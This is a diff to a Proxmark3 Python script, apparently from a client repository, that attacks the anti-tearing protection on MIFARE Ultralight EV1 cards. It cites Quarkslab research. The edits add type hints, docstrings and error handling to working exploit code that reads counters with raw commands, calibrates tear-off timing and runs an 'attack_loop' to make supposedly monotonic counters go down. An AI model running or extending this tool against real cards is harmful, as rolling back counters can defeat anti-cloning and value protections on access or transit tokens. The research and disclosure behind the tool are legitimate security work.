@@ -15,7 +15,7 @@
 # See LICENSE.txt for the text of the license.
 #-----------------------------------------------------------------------------
 # Bypass Anti-Tearing on MIFARE Ultralight EV1 monotonic counters (tear-off).
-# Script version: 2.1.0
+# Script version: 2.2.0
 # Created by W0rthlessS0ul (https://github.com/W0rthlessS0ul)
 # Based on Quarkslab research: https://blog.quarkslab.com/rfid-monotonic-counter-anti-tearing-defeated.html
 # Updated by M35MAR (https://github.com/M35mar)
@@ -27,6 +27,7 @@ import re
 import sys
 import threading
 import time
+from typing import Tuple, Optional
 
 import pm3
 
@@ -130,7 +131,7 @@ def wake_card() -> None:
     run_pm3("hf 14a reader")
 
 
-def parse_counter_output(output: str):
+def parse_counter_output(output: str) -> Tuple[Optional[str], Optional[int]]:
     payload = extract_pm3_payload(output)
     if not payload:
         return None, None
@@ -154,16 +155,19 @@ def parse_counter_output(output: str):
     return format_counter_hex(counter_int), counter_int
 
 
-def parse_tearing_output(output: str):
+def parse_tearing_output(output: str) -> Tuple[bool, str]:
     payload = extract_pm3_payload(output)
     if not payload:
         return False, "?"
 
-    tearing = payload.split()[0].upper()
-    return tearing == "BD", tearing
+    try:
+        tearing = payload.split()[0].upper()
+        return tearing == "BD", tearing
+    except IndexError:
+        return False, "?"
 
 
-def read_counter(counter_index: str):
+def read_counter(counter_index: str) -> Tuple[Optional[str], Optional[int]]:
     for _ in range(RETRY_COUNT):
         output = run_pm3(f"hf 14a raw -s -c 39 0{counter_index}")
         counter_hex, counter_int = parse_counter_output(output)
@@ -174,7 +178,7 @@ def read_counter(counter_index: str):
     return None, None
 
 
-def check_tearing_event(counter_index: str):
+def check_tearing_event(counter_index: str) -> Tuple[bool, str]:
     for _ in range(RETRY_COUNT):
         output = run_pm3(f"hf 14a raw -s -c 3E 0{counter_index}")
         try:
@@ -245,6 +249,17 @@ def run_reset_step(counter_index: str, delay_bd: int, delay_00: int) -> None:
 
 
 def tune_delay(delay_bd: int, previous_counter: int, current_counter: int, locked: bool) -> int:
+    """Tune BD delay based on counter changes.
+    
+    Args:
+        delay_bd: Current BD delay in microseconds
+        previous_counter: Previous counter value for comparison
+        current_counter: Current counter value
+        locked: If True, delay is locked and not adjusted
+        
+    Returns:
+        Adjusted delay_bd value
+    """
     if locked:
         return delay_bd
     if current_counter == previous_counter:
@@ -258,9 +273,13 @@ def is_ev1_card() -> bool:
     wake_card()
     output = run_pm3("hf 14a raw -s -c 60")
     payload = extract_pm3_payload(output)
-    parts = payload.split()
-    if len(parts) >= 5 and parts[4].upper() == "01":
-        return True
+    
+    try:
+        parts = payload.split()
+        if len(parts) >= 5 and parts[4].upper() == "01":
+            return True
+    except (IndexError, AttributeError):
+        pass
 
     info_output = run_pm3("hf mfu info").lower()
     return any(
@@ -340,8 +359,13 @@ class StopListener:
                 self._stop = True
 
 
-def calibrate_bd_delay(counter_index: str, stop: StopListener):
-    """Return (delay_bd, delay_00) where delay_00 = delay_bd - 15 (fixed offset)."""
+def calibrate_bd_delay(counter_index: str, stop: StopListener) -> Tuple[Optional[int], Optional[int]]:
+    """Auto-calibrate BD delay for tear-off.
+    
+    Returns:
+        Tuple of (delay_bd, delay_00) where delay_00 is calculated as delay_bd - DELAY_00_OFFSET,
+        or (None, None) if calibration failed.
+    """
     best_bd = None
 
     for delay_bd in range(DELAY_BD_MIN, DELAY_BD_MAX, CAL_STEP_US):
@@ -458,16 +482,13 @@ def attack_loop(counter_index: str, delay_bd: int, delay_00: int, stop: StopList
                     f"\n[{color('+', 'green')}] Decrement! {initial_hex.upper()} -> "
                     f"{final_hex.upper()} (delta {initial_int - final_int})"
                 )
-                # Consolidate the drop
-                incr_cnt(counter_index, "000000")
-                time.sleep(0.2)
-                incr_cnt(counter_index, "000000")
+                # Consolidate the drop by normalizing tear flag
                 normalize_tear_flag(counter_index)
                 delay_locked = True
                 tune_reference = final_int
                 continue
 
-            # Tuning logic
+            # Tuning logic for delay adjustment
             if final_int > initial_int:
                 if delay_locked:
                     delay_locked = False
@@ -476,7 +497,7 @@ def attack_loop(counter_index: str, delay_bd: int, delay_00: int, stop: StopList
                     new_delay = tune_delay(delay_bd, tune_reference, final_int, False)
                     if new_delay != delay_bd:
                         delay_bd = new_delay
-                        # delay_00 is intentionally left unchanged
+                        # delay_00 is intentionally not changed; only BD is adjusted during tuning
                     tune_reference = final_int
             else:
                 if not delay_locked:
@@ -548,7 +569,10 @@ def attack_loop(counter_index: str, delay_bd: int, delay_00: int, stop: StopList
                     delay_bd = new_delay
                 reset_reference = final_int
             elif final_int < initial_int:
-                print(f"\n[{color('+', 'green')}] Reset decrement! {initial_hex} -> {final_hex}")
+                print(
+                    f"\n[{color('+', 'green')}] Reset decrement! {initial_hex.upper()} -> "
+                    f"{final_hex.upper()} (delta {initial_int - final_int})"
+                )
                 delay_locked = True
                 reset_reference = final_int
             # else final_int slightly higher but still within range – ignore
@@ -576,7 +600,6 @@ def main():
     stop = StopListener()
     stop.start()
 
-    success = False
     try:
         if args.DelayBD is None:
             result = calibrate_bd_delay(args.cnt, stop)
@@ -594,8 +617,7 @@ def main():
             print("\n[x] Interrupted by user.")
             return 0
 
-        success = attack_loop(args.cnt, delay_bd, delay_00, stop)
-        if success:
+        if attack_loop(args.cnt, delay_bd, delay_00, stop):
             return 0
         if stop.stopped:
             print("\n[x] Interrupted by user.")
